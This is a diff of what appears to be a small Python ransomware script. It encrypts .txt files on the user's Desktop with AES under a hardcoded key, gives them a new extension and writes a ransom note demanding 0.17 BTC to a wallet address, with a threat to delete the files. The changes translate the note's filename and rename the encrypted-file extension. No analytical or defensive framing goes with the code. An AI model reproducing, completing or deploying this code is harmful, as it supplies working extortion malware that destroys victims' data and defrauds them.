@@ -7,7 +7,6 @@ filename_filter = ["*.txt"]
 base_path=Path.home()
 y = Path.home() / "Desktop"
 os.chdir(y)
-print('Criptografando')
 time.sleep(3)
 def revert(var):
     c=int(len(var)-1)
@@ -37,7 +36,7 @@ def varer():
             pastas.append(form(filename))
     return pastas
 def txt():
-    msg=open(f'{y}\\LEIA.txt','w+')
+    msg=open(f'{y}\\READ.txt','w+')
     msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
     msg.writelines("ALL YOUR FILES HAVE BEEN ENCRYPTED. \nAND IN 100 HRS THEY WILL BE DELETED.")
     msg.writelines("SO THAT DOES NOT HAPPEN SEND 0.17BTC TO OUR WALLET: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX.")
@@ -54,7 +53,7 @@ def criptografando():
             key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)
             crypto_data = aes.encrypt(file_data)
-            new_file = format_file + ".ransomcrypter"
+            new_file = format_file + ".666"
             new_file = open(f'{desktop}\\{new_file}', 'wb')
             new_file.write(crypto_data)
             new_file.close()
